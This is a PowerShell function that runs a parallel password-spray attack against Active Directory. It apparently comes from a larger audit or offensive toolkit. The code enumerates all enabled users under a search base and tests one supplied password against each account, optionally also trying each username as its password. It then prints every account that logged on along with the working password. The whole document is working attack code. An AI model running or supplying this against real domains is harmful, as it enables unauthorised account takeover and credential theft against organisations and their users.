function Start-PasswordSprayAttack {

    ################################################################################
    ######                                                                     #####
    ######    Run Password Spray in parallel                                   #####
    ######                                                                     #####
    ################################################################################

    param(
        [Parameter(Mandatory)] 
        [string]$SearchBase,
        [Parameter(Mandatory)]
        [string]$Password,
        [Parameter(Mandatory)]
        [string]$Server,
        [Switch]$IncludeSamAccountNameAsPassword,
        [ValidateRange(1, 100)]
        [int]$ThrottleLimit = 15
    )

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    $adDomain = Get-ADDomain -Server $Server
    $domain = $adDomain.NetBIOSName
    $domainFqdn = $adDomain.DNSRoot

    $users = Get-ADUser `
        -Filter "Enabled -eq 'True'" `
        -SearchBase $SearchBase `
        -Server $Server `
        -Properties SamAccountName

    $total = $users.Count

    if ($total -eq 0) {
        Invoke-Output -Type Warning -Message "No users found under $SearchBase"
        return
    }
    
    $cname = Convert-FromDNToCN -DistinguishedName $SearchBase
    Invoke-Output -Type Quit -Message "Press 'Q' at any time to abort Passwort Spray `n      for '$total' users under '$cname'!"

    $startTime = Get-Date
    $expectedUsers = @($users | ForEach-Object { "$domain\$($_.SamAccountName)" })

    $sprayWorker = {
        $user = "$using:domain\$($_.SamAccountName)"
        $isSuccess = $false
        $usedPassword = $using:Password
        $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $contextOptions = [System.DirectoryServices.AccountManagement.ContextOptions]::Negotiate

        try {
            try {
                $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $using:domainFqdn)
                $isSuccess = $principalContext.ValidateCredentials($_.SamAccountName, $using:Password, $contextOptions)
                $principalContext.Dispose()
            }
            catch {
                $isSuccess = $false
            }

            if ((-not $isSuccess) -and $using:IncludeSamAccountNameAsPassword) {
                if ($using:IncludeSamAccountNameAsPassword) {
                    try {
                        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $using:domainFqdn)
                        $isSuccess = $principalContext.ValidateCredentials($_.SamAccountName, $_.SamAccountName, $contextOptions)
                        $principalContext.Dispose()
                        if ($isSuccess) {
                            $usedPassword = $_.SamAccountName
                        }
                    }
                    catch {
                        $isSuccess = $false
                    }
                }
            }

            [PSCustomObject]@{
                User     = $user
                Password = $usedPassword
                Success  = $isSuccess
            }
        }
        catch {
            [PSCustomObject]@{
                User     = $user
                Password = $usedPassword
                Success  = $false
            }
        }
    }

    $allResults = [System.Collections.Generic.List[object]]::new()
    $processed = 0

    $job = $users | ForEach-Object -Parallel $sprayWorker -ThrottleLimit $ThrottleLimit -AsJob

    while ($job.State -eq "Running") {

        if ([Console]::KeyAvailable) {
            if ([Console]::ReadKey($true).Key -eq 'Q') {
                Stop-Job $job
                break
            }
        }

        $newResults = Receive-Job $job
        if ($null -ne $newResults) {
            foreach ($r in @($newResults)) {
                $allResults.Add($r)
            }
        }

        $processed = $allResults.Count
        $percent = [math]::Round(($processed / $total) * 100, 2)
        $elapsed = (Get-Date) - $startTime
        $rate = if ($elapsed.TotalSeconds -gt 0) { [math]::Round($processed / $elapsed.TotalSeconds, 2) } else { 0 }
        $eta = if ($rate -gt 0) { [math]::Round(($total - $processed) / $rate, 1) } else { 0 }

        Write-Progress `
            -Activity "Performing Password Spray" `
            -Status "Done: $processed/$total | $rate ops/s | ETA: $eta s | Throttle: $ThrottleLimit" `
            -PercentComplete $percent

        Start-Sleep -Milliseconds 250
    }

    $remainingResults = Receive-Job $job
    if ($null -ne $remainingResults) {
        foreach ($r in @($remainingResults)) {
            $allResults.Add($r)
        }
    }
    Remove-Job $job -Force -ErrorAction SilentlyContinue

    # Guarantee one output object per input account.
    $returnedUsers = @($allResults | ForEach-Object { $_.User })
    foreach ($expectedUser in $expectedUsers) {
        if ($expectedUser -notin $returnedUsers) {
            $allResults.Add([PSCustomObject]@{
                    User     = $expectedUser
                    Password = $Password
                    Success  = $false
                })
        }
    }

    Write-Progress -Activity "Performing Password Spray" -Completed

    Invoke-Output -Type Info -Message "Processed users: $total | Returned results: $($allResults.Count)"

    $success = $allResults | Where-Object { $_.Success -eq $true }

    if ($success) {

        Invoke-Output -Type TextMaker -Message "Successful Logons under $cname`:" -TM $($success.count)
        $success | ForEach-Object {
            Invoke-Output -Type Bullet -Message "$($_.User) Pw:" -TM  $_.Password 
        }
    }
    else {
        Invoke-Output -Type Warning -Message "No successful logons!"
    }

    Invoke-Output -Type Success -Message "Finished Password Spray for current scope."

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}